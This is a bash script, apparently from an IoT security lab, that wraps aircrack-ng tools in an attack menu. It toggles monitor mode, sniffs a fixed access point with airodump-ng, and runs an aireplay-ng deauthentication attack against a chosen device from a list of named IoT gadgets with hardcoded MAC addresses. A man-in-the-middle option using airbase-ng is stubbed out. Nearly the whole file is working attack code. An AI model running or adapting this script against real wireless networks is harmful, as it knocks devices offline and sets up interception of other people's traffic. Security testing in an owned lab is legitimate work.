#! /bin/bash



function Monitor(){
	var=$(iwconfig wlan1mon | grep wlan1mon)
	str="No such device"
	if [[ "$str" == *"$var"*  ]];
	then
		airmon-ng start wlan1
		echo 'Turn on the monitor mode on wlan1'
		if [[ $1  -eq 0 ]]
		then
			return 0
		fi
	elif [[  "$str" != *"$var"* && $1 -eq 0 ]];
	then
		airmon-ng stop wlan1mon
		echo 'Turn off the monitor mode on wlan1mon'
		return 0
	fi

	airodump-ng --channel 6 --bssid 4C:32:75:C4:A4:8E wlan1mon

}

function FindTarget(){
	echo 'Here is the list of known devices, please choose the target.'
	echo '1. Hello Barbie'
	echo '2. TRENDnet Secure Cam'
	echo '3. Canary Home'
	echo '4. ZTE android phone'
	echo '5. Samsung TV'
	echo '6. Wemo Switch'
	echo '7. Amazon Device1'
	echo '8. Amaozn Device2'
	echo '9. My iphone'
	read TARGET

	if [[ $Option -eq 2  ]];
	then
		echo 'Select Packets number->must be in integer'
       		read NumOfPac
	fi

	local num=$1
	eval $num=$NumOfPac
	local myresult=$2

	case $TARGET in
		1) eval $myresult="80:A5:89:10:33:42";;
		2) eval $myresult="D8:EB:97:D7:D4:6E";;
		3) eval $myresult="D8:42:E2:01:7B:04";;
		4) eval $myresult="D8:55:A3:CB:2D:6E";;	
		5) eval $myresult="FC:F1:36:76:35:41";;
		6) eval $myresult="60:38:E0:5F:1B:69";;
		7) eval $myresult="0C:47:C9:13:E5:80";;
		8) eval $myresult="34:D2:70:65:07:3F";;	
		9) eval $myresult="4C:57:CA:36:35:E2";;
		*) echo 'Target Unknown';;

		#1) Deaut1 $NumOfPac "80:A5:89:10:33:42";;
		#2) Deaut1 $NumOfPac "D8:EB:97:D7:D4:6E";;
		#3) Deaut1 $NumOfPac "D8:42:E2:01:7B:04";;
		#4) Deaut1 $NumOfPac "D8:55:A3:CB:2D:6E";;	
		#5) Deaut1 $NumOfPac "FC:F1:36:76:35:41";;
		#6) Deaut1 $NumOfPac "60:38:E0:5F:1B:69";;
		#*) echo 'Target unknown';;
		
	esac	

}


function Deaut1(){
	aireplay-ng -0 $1 -a 4C:32:75:C4:A4:8E -c $2 --ignore-negative wlan1mon
}

function MITM() {
	airbase-ng -h $1 wlan1mon
}



echo 'There are some options that you can use for attacking, please tell me what do you want?'

echo '0. Turn On/ Off the monitor mode'
echo '1. Monitoring the network/devices in ECEIoT.'
echo '2. Deauthentication Attack.'
echo '3. Man in the middle attack.'

read Option

case $Option in
	0)	Monitor $Option
		;;
	1)	Monitor	$Option;;
	2) 	FindTarget num1 target $Option
		Deaut1 $num1 $target
		;;
	3) 	echo 'developing....'
		#FindTarget num1 target $Option
		#MITM $target
		;;
	*) echo 'yet finish the setting';;
		
esac







